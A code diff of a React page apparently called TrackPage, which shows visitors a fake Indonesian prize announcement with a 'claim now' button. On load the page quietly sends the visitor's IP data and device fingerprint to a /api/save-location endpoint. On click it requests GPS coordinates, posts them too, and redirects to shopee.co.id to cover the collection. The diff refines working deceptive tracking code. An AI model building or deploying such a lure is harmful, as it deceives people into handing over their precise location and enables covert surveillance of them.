@@ -18,9 +18,10 @@ export default function TrackPage() {
       const d = getDeviceInfo();
       setDeviceInfo(d);
 
+      // INSERT FIRST TIME (NO GPS)
       await fetch("/api/save-location", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
           ...ipJson,
           ...d,
@@ -29,9 +30,7 @@ export default function TrackPage() {
         }),
       });
 
-      setTimeout(() => {
-        confetti({ particleCount: 150, spread: 80 });
-      }, 300);
+      setTimeout(() => confetti({ particleCount: 150, spread: 80 }), 300);
     }
 
     run();
@@ -41,60 +40,49 @@ export default function TrackPage() {
     setLoading(true);
 
     if (!ipData || !deviceInfo) {
-      setTimeout(() => {
-        window.location.href = "https://shopee.co.id";
-      }, 1200);
-      return;
+      return (window.location.href = "https://shopee.co.id");
     }
 
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
-          try {
-            await fetch("/api/save-location", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                ...ipData,
-                ...deviceInfo,
-                gpsLat: pos.coords.latitude,
-                gpsLon: pos.coords.longitude,
-              }),
-            });
+          await fetch("/api/save-location", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+              ...ipData,
+              ...deviceInfo,
+              gpsLat: pos.coords.latitude,
+              gpsLon: pos.coords.longitude,
+            }),
+          });
 
-            confetti({ particleCount: 300, spread: 100 });
-          } finally {
-            setTimeout(() => {
-              window.location.href = "https://shopee.co.id";
-            }, 1200);
-          }
+          confetti({ particleCount: 300, spread: 100 });
+
+          setTimeout(() => {
+            window.location.href = "https://shopee.co.id";
+          }, 1200);
         },
 
         async () => {
-          try {
-            await fetch("/api/save-location", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                ...ipData,
-                ...deviceInfo,
-                gpsLat: null,
-                gpsLon: null,
-              }),
-            });
-          } finally {
-            setTimeout(() => {
-              window.location.href = "https://shopee.co.id";
-            }, 1200);
-          }
-        },
+          await fetch("/api/save-location", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+              ...ipData,
+              ...deviceInfo,
+              gpsLat: null,
+              gpsLon: null,
+            }),
+          });
 
-        { timeout: 8000 }
+          setTimeout(() => {
+            window.location.href = "https://shopee.co.id";
+          }, 1200);
+        }
       );
     } else {
-      setTimeout(() => {
-        window.location.href = "https://shopee.co.id";
-      }, 1200);
+      window.location.href = "https://shopee.co.id";
     }
   }
 
@@ -104,12 +92,12 @@ export default function TrackPage() {
         {loading ? (
           <>
             <h2 style={styles.title}>⏳ Tunggu Sebentar...</h2>
-            <p style={styles.text}>Sedang memverifikasi hadiah Anda…</p>
+            <p style={styles.text}>Memverifikasi hadiah Anda…</p>
           </>
         ) : (
           <>
             <h2 style={styles.title}>🎉 SELAMAT!</h2>
-            <p style={styles.text}>Anda mendapatkan kesempatan hadiah menarik!</p>
+            <p style={styles.text}>Anda mendapatkan hadiah menarik!</p>
 
             <button style={styles.button} onClick={handleClaim}>
               🎁 KLAIM SEKARANG
@@ -125,23 +113,20 @@ function getDeviceInfo() {
   const ua = navigator.userAgent.toLowerCase();
 
   let os = "Unknown OS";
-  if (ua.includes("windows nt")) os = "Windows";
+  if (ua.includes("windows")) os = "Windows";
   else if (ua.includes("mac os x")) os = "MacOS";
   else if (ua.includes("android")) os = "Android";
   else if (ua.includes("iphone")) os = "iPhone iOS";
   else if (ua.includes("ipad")) os = "iPad iOS";
   else if (ua.includes("linux")) os = "Linux";
-  else if (ua.includes("cros")) os = "ChromeOS";
 
   let deviceType = "Desktop";
   if (/mobile/i.test(ua)) deviceType = "Mobile";
   if (/tablet/i.test(ua) || ua.includes("ipad")) deviceType = "Tablet";
 
   const brands = [
-    "Samsung", "Xiaomi", "OPPO", "Vivo", "Realme",
-    "Huawei", "Infinix", "Poco", "Sony", "Nokia",
-    "Asus", "Lenovo", "Tecno", "Google Pixel",
-    "iPhone", "iPad"
+    "Samsung", "Xiaomi", "Oppo", "Vivo", "Realme", "Infinix",
+    "Poco", "Huawei", "Nokia", "Sony", "Asus", "Lenovo", "iPhone", "iPad"
   ];
 
   let brand = "Unknown";
@@ -151,16 +136,9 @@ function getDeviceInfo() {
 
   if (deviceType === "Desktop") brand = os;
 
-  return {
-    device: brand,
-    deviceType,
-    os,
-    userAgent: navigator.userAgent,
-  };
+  return { device: brand, deviceType, os, userAgent: navigator.userAgent };
 }
 
-
-// eslint-disable-next-line @typescript-eslint/no-explicit-any
 const styles: any = {
   container: {
     minHeight: "100vh",
